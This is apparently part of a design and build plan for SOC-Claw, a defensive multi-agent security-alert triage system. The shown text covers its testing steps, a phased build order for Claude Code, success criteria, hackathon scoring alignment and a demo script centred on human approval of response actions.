- Every response plan logged with: timestamp, alert_id, num_steps, action_types, approval_required_count
- Every analyst action (approve/reject/steer) logged with: timestamp, alert_id, action, details
- Every steering interaction logged with: timestamp, analyst_input, before_severity, after_severity

### Testing approach
- Test each triage tool independently with 3 sample inputs
- Test Triage Agent with 5 alerts (2 TP, 2 FP, 1 ambiguous) before running full set
- Test Verifier Agent with 4 mock scenarios:
  - Correct P1 triage → should confirm
  - Correct P4 triage → should confirm
  - P3 triage where evidence clearly shows P1 → should adjust to P1
  - P1 triage with no IOCs and unknown IPs → should adjust to P3
- Test Response Agent with 4 mock verdicts (one per severity level):
  - P1 → should recommend 5 steps including isolate, block, forensics, escalate, ticket
  - P2 → should recommend 4 steps, no isolation
  - P3 → should recommend 3-4 steps, no containment
  - P4 → should recommend 1-2 steps, logging only
- Verify Response Agent never tries to call tools
- Test the UI approval flow: approve an action → verify response_tools function fires
- Test steering with the red team lab scenario (P1 → P4 transition across all three agents)
- Test the full pipeline end-to-end with 5 alerts before running the benchmark
- Run full benchmark only after individual components pass

---

## 11. Build order (for Claude Code)

Follow this exact sequence. Do not skip ahead.

**Phase 1: Data layer**
1. Create all 4 JSON data files in `data/`
2. Validate: every alert hostname exists in asset_inventory, every malicious dest_ip exists in threat_intel

**Phase 2: Tools**
3. Build triage tools: ip_reputation.py, mitre_lookup.py, asset_lookup.py
4. Build response_tools.py (these will be called by UI, not by any agent)
5. Test each tool with sample inputs — add a `if __name__ == "__main__"` test block to each

**Phase 3: Triage Agent**
6. Build triage_agent.py with the exact system prompt from Section 5.1
7. This is the ONLY agent with tool definitions
8. Test with ALT-001 (should return P1) and ALT-011 (should return P4)

**Phase 4: Verifier Agent**
9. Build verifier_agent.py with the exact system prompt from Section 5.2
10. NO tool definitions — confirm it never tries to call tools
11. Test with 4 mock scenarios:
    - Feed it a correct P1 triage → should return "confirmed"
    - Feed it a correct P4 triage → should return "confirmed"
    - Feed it a P3 triage where evidence clearly shows P1 → should return "adjusted" with P1
    - Feed it a P1 triage with no IOCs and unknown IPs → should return "adjusted" with P3

**Phase 5: Response Agent**
12. Build response_agent.py with the exact system prompt from Section 5.3
13. NO tool definitions — confirm it never tries to call tools
14. Test with 4 mock verdicts:
    - P1 verdict → should output 5-step plan with isolate, block, forensics, escalate, ticket
    - P2 verdict → should output 4-step plan, no isolation
    - P3 verdict → should output 3-4 step plan, no containment
    - P4 verdict → should output 1-2 step plan, logging only
15. Verify every step has action_type, target, reasoning, urgency, requires_approval

**Phase 6: Pipeline**
16. Build pipeline.py wiring all three agents: Triage → Verifier → Response
17. Implement merge_verdict for confirmed/adjusted/flagged handling
18. Implement execute_approved_action to map action_types to response_tools functions
19. Run 5 alerts end-to-end, verify:
    - Triage calls tools correctly
    - Verifier receives triage output and produces verification
    - Response Agent receives merged verdict and produces action plan
    - No tools are called by Verifier or Response Agent

**Phase 7: UI**
20. Build Gradio app with all four panels (alert feed, triage, verification, response plan)
21. Implement action approval flow: Approve button → execute_approved_action → show result
22. Implement Reject button → mark step as skipped
23. Implement "Approve All" / "Reject All" bulk buttons
24. Test steering: verify full pipeline re-runs and all panels update
25. Test flagged-alert flow: verify UI pauses and shows override controls

**Phase 8: Benchmark**
26. Build harness.py with all metrics from Section 7
27. In benchmark mode: auto-approve all actions (skip analyst approval delay)
28. Run full 30-alert benchmark, save results
29. Verify that accuracy_improvement (verified - raw) is positive

**Phase 9: NemoClaw integration**
30. Configure nemoclaw_policy.yaml and privacy_routes.yaml
31. Deploy pipeline inside NemoClaw sandbox
32. Verify audit logs and routing decisions

---

## 12. Success criteria

The build is complete when:

1. All 30 alerts process through the full three-agent pipeline without errors
2. Triage accuracy (raw, before verification) > 75% against ground truth labels
3. Verified accuracy (after Verifier) > 85% against ground truth labels
4. Accuracy improvement from Verifier is measurable and positive (at least +5%)
5. Response Agent produces valid response plans for all 4 severity levels
6. Every P1 plan includes isolate + block + escalate steps; every P4 plan is logging only
7. Analyst can approve/reject individual steps in the UI, and approved steps execute correctly
8. Analyst steering visibly changes severity and response plan across all three agents
9. Verifier correctly catches at least 2 triage errors in the 30-alert benchmark
10. Flagged alerts pause the pipeline and surface override controls in the UI
11. Benchmark harness produces a comparison table with latency/throughput/accuracy including verification and response plan metrics
12. Privacy routing log shows sensitive data routed to local inference
13. NemoClaw audit log confirms sandboxed execution

---

## 13. Scoring alignment

| Criterion | Points | How SOC-Claw addresses it |
|-----------|--------|---------------------------|
| Innovation & problem significance | 5 | SOC alert overload is a $4.45M/breach problem. Three-agent pipeline with self-correction (Verifier) AND human-in-the-loop response approval is novel — most agentic systems either auto-execute or just recommend, not both with a verification layer. |
| Technical execution | 5 | Deep Tech: three-agent pipeline with verification loop, tool-calling on Triage Agent, reasoning-only Verifier and Response agents, human-in-the-loop approval flow, NemoClaw sandbox, privacy routing. |
| Inference efficiency impact | 4 | Benchmarked latency/throughput. Only 1 of 3 agents needs tools, so 2/3 of the pipeline is pure inference — fast. Verifier adds minimal latency but measurable accuracy gain. Privacy router reduces cloud costs. |
| Presentation & demo | 3 | Live walkthrough: triage → verification → response plan → analyst approval. Demo a Verifier catch. Demo steering. Show approve/reject flow. Benchmark before/after accuracy. |
| Open-source contribution | 3 | SOC Agent Starter Kit: three-agent verification pattern (reusable beyond security), human-in-the-loop approval framework, synthetic dataset, benchmark scripts. |

---

## 14. Demo script (4 minutes)

### The hook (30 seconds)
"SOC analysts see 4,000 alerts per day. 95% are noise. Missing the 5% that matter costs $4.45M per breach. But here's the harder question — when we automate triage with AI, how do we trust the AI's judgment? And how do we make sure it doesn't auto-isolate a production server by mistake? SOC-Claw solves both: AI triages and verifies its own decisions, then the human approves the response plan before anything executes."

### Live alert walkthrough (90 seconds)
Feed ALT-001 (PowerShell on domain controller). Show:
- Triage Agent enriching in real time (IP flagged as C2, asset is critical DC, MITRE maps to T1059.001)
- Triage verdict: P1, 92% confidence
- Verifier evaluating: checks evidence alignment ✓, reasoning completeness ✓, logical consistency ✓, bias check ✓ → CONFIRMED
- Response Agent produces 5-step plan: isolate host, block C2 IP, collect forensics, escalate Tier 3, create critical ticket
- Each step shows reasoning and urgency
- Analyst clicks "Approve All" → actions execute → status updates to "Executed ✓"

### Verifier catch demo (60 seconds)
Feed an alert where the Triage Agent under-scores (says P3 for a clear P1). Show:
- Triage says P3, 65% confidence
- Verifier catches it: "Confirmed C2 on a critical asset — this is P1. Triage underweighted asset criticality." → ADJUSTED to P1
- Response Agent now plans a P1 response (isolation + blocking) instead of the P3 plan (just a ticket)
- "Before verification: 78% accuracy. After: 88%. The Verifier caught 3 errors in 30 alerts."

### Steering demo (45 seconds)
Same alert, analyst types: "This server is in our red team lab, re-evaluate."
- All three agents re-run. Triage → P4, Verifier → confirmed, Response → "Log only, no action needed"
- Response plan shrinks from 5 steps to 1
- Privacy routing log: "Alert payload stayed local."

### Close (15 seconds)
"Three agents. One verifies the other. Humans approve before anything fires. The SOC Agent Starter Kit is on GitHub — the verification pattern works for any domain where AI decisions need a QA step."